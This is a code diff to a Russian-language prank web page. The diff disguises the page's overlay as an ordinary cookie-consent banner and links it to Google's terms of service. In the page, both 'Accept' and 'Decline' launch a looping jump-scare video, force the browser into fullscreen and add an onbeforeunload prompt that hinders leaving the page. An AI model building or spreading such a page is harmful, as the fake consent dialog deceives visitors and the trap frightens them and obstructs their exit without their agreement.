@@ -134,27 +134,62 @@
     </style>
 </head>
 <body>
+    <!-- Оверлей с предупреждением о cookies -->
     <div id="overlay" class="overlay">
         <div class="overlay-body">
-            <p class="overlay-title">Зря ты сюда полез</p>
-            <p class="overlay-description">Этот сайт использует cookies, чтобы собирать информацию об ошибках и улучшить сайт. Прими cookies для хорошей производительности.</p>
+            <p class="overlay-title">Cookies и сторонний контент</p>
+            <p class="overlay-description">Этот сайт использует cookies, чтобы собирать информацию об ошибках и улучшить сайт. Примите cookies для хорошей производительности.</p>
             <div class="overlay-buttons-wrapper">
                 <div id="accept-button" class="overlay-button">Принять</div>
                 <div id="decline-button" class="overlay-button">Отклонить</div>
             </div>
-            <a href="https://parad1st.github.io/" target="_blank" class="overlay-link">Пользовательское соглашение</a>
+            <a href="https://policies.google.com/terms?hl=ru" target="_blank" class="overlay-link">Пользовательское соглашение</a>
         </div>
     </div>
+
+    <!-- Видео с скримером -->
     <div class="scare">
         <video id="video" autoplay loop>
             <source src="assets/video.mp4" type="video/mp4">
             Ваш браузер не поддерживает видео.
         </video>
     </div>
+
     <script type="text/javascript">
         const video = document.getElementById("video");
         const overlay = document.getElementById("overlay");
         const declineButton = document.getElementById("decline-button");
         const acceptButton = document.getElementById("accept-button");
 
-      
+        let hasClicked;
+
+        // Блокировка закрытия страницы
+        window.onbeforeunload = function() {
+            if (hasClicked) return true;
+        };
+
+        // Функция для закрытия оверлея и запуска видео
+        function buttonClick(event) {
+            event.preventDefault();
+            if (!hasClicked) hasClicked = true;
+            overlay.hidden = true;
+            video.play();
+            videoClick();
+        }
+
+        // Переход в полноэкранный режим при клике на видео
+        function videoClick(event) {
+            if (event) event.preventDefault();
+            const { documentElement } = document;
+            if (documentElement.requestFullscreen) documentElement.requestFullscreen();
+            else if (documentElement.mozRequestFullScreen) documentElement.mozRequestFullScreen();
+            else if (documentElement.webkitRequestFullscreen) documentElement.webkitRequestFullscreen();
+            else if (documentElement.msRequestFullscreen) documentElement.msRequestFullscreen();
+        }
+
+        acceptButton.addEventListener("click", buttonClick);
+        declineButton.addEventListener("click", buttonClick);
+        video.addEventListener("click", videoClick);
+    </script>
+</body>
+</html>
